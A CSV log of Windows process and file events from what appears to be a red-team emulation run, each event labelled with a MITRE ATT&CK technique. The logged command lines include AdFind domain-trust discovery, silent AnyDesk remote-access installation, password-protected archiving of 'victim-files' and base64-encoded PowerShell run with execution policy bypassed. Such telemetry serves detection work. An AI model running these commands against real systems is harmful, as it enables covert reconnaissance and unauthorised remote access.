"TPP","EventTime","Level","ParentCommandLine","CommandLine","EventID"
"T1087.002","2025-04-06T02:26:21.033853800Z","3"," powershell.exe -ExecutionPolicy Bypass -C ""& \""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp""","\Users\Administrator\ExternalPayloads\AdFind.exe"" -gcb -sc trustdmp","1"
"T1087.002","2025-04-06T02:26:20.695823800Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," powershell.exe -ExecutionPolicy Bypass -C ""& \""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp""","1"
"T1560.001","2025-04-06T02:24:49.288111200Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1219","2025-04-06T02:20:57.869721300Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-control","11"
"T1219","2025-04-06T02:20:57.520043300Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-control","11"
"T1219","2025-04-06T02:20:56.635164100Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
"T1219","2025-04-06T02:20:56.264564500Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-06T02:20:55.612156100Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
"T1219","2025-04-06T02:20:55.229178100Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-06T02:20:54.819172800Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
"T1219","2025-04-06T02:20:53.966082600Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
"T1219","2025-04-06T02:20:52.936230100Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","","1"
"T1219","2025-04-06T02:20:50.033101500Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","","1"
"T1087.002","2025-04-06T02:18:27.114201600Z","3"," powershell.exe -ExecutionPolicy Bypass -C ""& \""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp""","\Users\Administrator\ExternalPayloads\AdFind.exe"" -gcb -sc trustdmp","1"
"T1087.002","2025-04-06T02:18:26.337690500Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," powershell.exe -ExecutionPolicy Bypass -C ""& \""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp""","1"
"T1560.001","2025-04-06T02:16:46.376448600Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1087.002","2025-04-06T01:50:45.739063800Z","3"," powershell.exe -ExecutionPolicy Bypass -C ""& \""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp""","\Users\Administrator\ExternalPayloads\AdFind.exe"" -gcb -sc trustdmp","1"
"T1087.002","2025-04-06T01:50:44.521035400Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," powershell.exe -ExecutionPolicy Bypass -C ""& \""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp""","1"
"T1560.001","2025-04-06T01:48:57.830272800Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1219","2025-04-06T01:42:47.741865300Z","2","","","22"
"T1219","2025-04-06T01:42:47.520837400Z","2","","","22"
"T1219","2025-04-06T01:42:47.246759900Z","2","","","22"
"T1219","2025-04-06T01:42:46.838371300Z","2","","","22"
"T1219","2025-04-06T01:42:46.635394900Z","2","","","22"
"T1219","2025-04-06T01:42:46.446597800Z","2","","","22"
"T1219","2025-04-06T01:42:46.182840100Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-control","11"
"T1219","2025-04-06T01:42:45.807818400Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-control","11"
"T1219","2025-04-06T01:42:45.333464600Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
"T1219","2025-04-06T01:42:44.480587800Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-06T01:42:44.136442100Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
"T1219","2025-04-06T01:42:43.984785900Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-06T01:42:43.801876900Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
"T1219","2025-04-06T01:42:43.309675900Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
"T1219","2025-04-06T01:42:42.633072200Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","","1"
"T1219","2025-04-06T01:42:39.895238200Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","","1"
"T1087.002","2025-04-06T01:39:58.274559300Z","3"," powershell.exe -ExecutionPolicy Bypass -C ""& \""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp""","\Users\Administrator\ExternalPayloads\AdFind.exe"" -gcb -sc trustdmp","1"
"T1087.002","2025-04-06T01:39:57.260800800Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," powershell.exe -ExecutionPolicy Bypass -C ""& \""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp""","1"
"T1560.001","2025-04-06T01:38:17.790961700Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1560.001","2025-04-06T01:38:17.790961700Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1219","2025-04-06T01:20:50.816001800Z","2","","","22"
"T1219","2025-04-06T01:20:50.618269200Z","2","","","22"
"T1219","2025-04-06T01:20:50.177377600Z","2","","","22"
"T1219","2025-04-06T01:20:49.759870700Z","2","","","22"
"T1219","2025-04-06T01:20:01.106632100Z","2","","","22"
"T1219","2025-04-06T01:19:57.486999000Z","2","","","22"
"T1219","2025-04-06T00:53:18.531131200Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-control","11"
"T1219","2025-04-06T00:53:16.518123800Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-control","11"
"T1219","2025-04-06T00:53:15.084790100Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-06T00:53:14.003426700Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
"T1219","2025-04-06T00:53:13.484709900Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-06T00:53:13.175797300Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
"T1219","2025-04-06T00:53:12.166942000Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
"T1219","2025-04-06T00:53:11.226752700Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
"T1219","2025-04-06T00:53:10.245931400Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","","1"
"T1219","2025-04-06T00:53:07.208161400Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","","1"
"T1087.002","2025-04-06T00:50:41.206847400Z","3"," powershell.exe -ExecutionPolicy Bypass -C ""& \""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp""","\Users\Administrator\ExternalPayloads\AdFind.exe"" -gcb -sc trustdmp","1"
"T1087.002","2025-04-06T00:50:40.216932100Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," powershell.exe -ExecutionPolicy Bypass -C ""& \""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp""","1"
"T1560.001","2025-04-06T00:49:08.096737600Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1087.002","2025-04-06T00:49:03.013625800Z","3"," powershell.exe -ExecutionPolicy Bypass -C ""& \""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp""","\Users\Administrator\ExternalPayloads\AdFind.exe"" -gcb -sc trustdmp","1"
"T1087.002","2025-04-06T00:49:02.710960700Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," powershell.exe -ExecutionPolicy Bypass -C ""& \""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp""","1"
"T1560.001","2025-04-06T00:47:26.879034000Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1087.002","2025-04-06T00:46:55.812962300Z","3"," powershell","\Users\Administrator\ExternalPayloads\AdFind.exe"" -gcb -sc trustdmp","1"
"T1087.002","2025-04-06T00:46:55.453385400Z","3"," powershell","\Users\Administrator\ExternalPayloads\AdFind.exe"" -gcb -sc trustdmp","1"
"T1059.001","2025-04-06T00:45:33.106045900Z","2","FromBase64String('CiR1dWlkPSI1ZDk4ZTBkOTY1ZWMiCiIke3V1aWR9OiBydW5uaW5nIgoiNWQ5OGUwZDk2NWVjOiBwYXVzZUxvZyIKJFByb2dyZXNzUHJlZmVyZW5jZT0nU2lsZW50bHlDb250aW51ZScKJHJfPSdkZGMzNjdlZDVjODkzNmVmZTM5NWNmZmVlYzI3OWIwNGZmZDdkYjc4JwokcD0kZW52OlBST0NFU1NPUl","\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -ExecutionPolicy Unrestricted -NoLogo -NoProfile -NonInteractive -EncodedCommand CgAkAHUAdQBpAGQAPQAiADUAZAA5ADgAZQAwAGQAOQA2ADUAZQBjACIACgAiACQAewB1AHUAaQBkAH0AOgAgAHIAdQBuAG4AaQBuAGcAIgAKACIANQBkADkAOABlADAAZAA5ADYANQBlAGMAOgAgAHAAYQB1AHMAZQBMAG8AZwAiAAoAJABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQA9ACcAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAnAAoAJAByAF8APQAnAGQAZABjADMANgA3AGUAZAA1AGMAOAA5ADMANgBlAGYAZQAzADkANQBjAGYAZgBlAGUAYwAyADcAOQB","1"
"T1059.001","2025-04-06T00:43:10.667134400Z","2","FromBase64String('CiR1dWlkPSIxMmVkMTllM2MwNDgiCiIke3V1aWR9OiBydW5uaW5nIgoiMTJlZDE5ZTNjMDQ4OiBwYXVzZUxvZyIKJFByb2dyZXNzUHJlZmVyZW5jZT0nU2lsZW50bHlDb250aW51ZScKJHJfPSdkZGMzNjdlZDVjODkzNmVmZTM5NWNmZmVlYzI3OWIwNGZmZDdkYjc4JwokcD0kZW52OlBST0NFU1NPUl","\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -ExecutionPolicy Unrestricted -NoLogo -NoProfile -NonInteractive -EncodedCommand CgAkAHUAdQBpAGQAPQAiADEAMgBlAGQAMQA5AGUAMwBjADAANAA4ACIACgAiACQAewB1AHUAaQBkAH0AOgAgAHIAdQBuAG4AaQBuAGcAIgAKACIAMQAyAGUAZAAxADkAZQAzAGMAMAA0ADgAOgAgAHAAYQB1AHMAZQBMAG8AZwAiAAoAJABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQA9ACcAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAnAAoAJAByAF8APQAnAGQAZABjADMANgA3AGUAZAA1AGMAOAA5ADMANgBlAGYAZQAzADkANQBjAGYAZgBlAGUAYwAyADcAOQB","1"
"T1087.002","2025-04-06T00:41:30.423277900Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," powershell.exe -ExecutionPolicy Bypass -C ""& \""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp""","1"
"T1560.001","2025-04-06T00:39:53.393794500Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1087.002","2025-04-06T00:36:45.863981200Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C & ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -gcb -sc trustdmp","1"
"T1560.001","2025-04-06T00:34:50.544532000Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1560.001","2025-04-06T00:34:50.382170100Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1087.002","2025-04-06T00:32:12.276077700Z","3"," powershell","\ExternalPayloads\AdFind.exe"" -gcb -sc trustdmp","1"
"T1087.002","2025-04-06T00:31:41.300105100Z","3"," powershell","\ExternalPayloads\AdFind.exe"" -gcb -sc trustdmp","1"
"T1087.002","2025-04-06T00:30:43.551704500Z","3"," powershell","\ExternalPayloads\AdFind.exe"" -sc trustdmp","1"
"T1219","2025-04-06T00:22:25.531113600Z","2","","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
"T1219","2025-04-06T00:21:56.679646800Z","2","","","22"
"T1219","2025-04-06T00:21:25.867584000Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:20:54.209382100Z","2","","","22"
"T1219","2025-04-06T00:20:25.798567600Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:20:02.983418700Z","2","","","22"
"T1219","2025-04-06T00:19:26.433012600Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:18:56.099458800Z","2","","","22"
"T1219","2025-04-06T00:18:26.398694100Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:17:48.532922800Z","2","","","22"
"T1219","2025-04-06T00:17:26.038466500Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:16:31.832604000Z","2","","","22"
"T1219","2025-04-06T00:16:25.751847200Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:15:34.069655100Z","2","","","22"
"T1219","2025-04-06T00:15:25.884155300Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:14:30.640161000Z","2","","","22"
"T1219","2025-04-06T00:14:25.611793700Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:13:37.424921400Z","2","","","22"
"T1219","2025-04-06T00:13:26.344893300Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:12:44.402893500Z","2","","","22"
"T1219","2025-04-06T00:12:25.999546400Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:11:32.252157900Z","2","","","22"
"T1219","2025-04-06T00:11:26.178453300Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:10:26.585628300Z","2","","","22"
"T1219","2025-04-06T00:10:26.361335100Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:09:25.639817900Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:09:17.546153400Z","2","","","22"
"T1219","2025-04-06T00:08:25.655760100Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:08:23.613379000Z","2","","","22"
"T1219","2025-04-06T00:08:21.627319500Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-06T00:08:21.365965000Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-06T00:08:20.304726200Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","","1"
"T1219","2025-04-06T00:08:17.704544600Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","","1"
"T1219","2025-04-06T00:07:28.832026200Z","2","","","22"
"T1219","2025-04-06T00:07:25.780794400Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:06:36.004334500Z","2","","","22"
"T1219","2025-04-06T00:06:26.246739800Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1087.002","2025-04-06T00:05:40.628002300Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C ""$PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" None -gcb -sc trustdmp","1"
"T1219","2025-04-06T00:05:26.202805500Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:05:23.165699000Z","2","","","22"
"T1219","2025-04-06T00:04:25.540176100Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:04:24.475307000Z","2","","","22"
"T1560.001","2025-04-06T00:03:50.469520100Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1219","2025-04-06T00:03:30.424983400Z","2","","","22"
"T1219","2025-04-06T00:03:26.334037300Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:02:26.275509600Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:02:24.229408100Z","2","","","22"
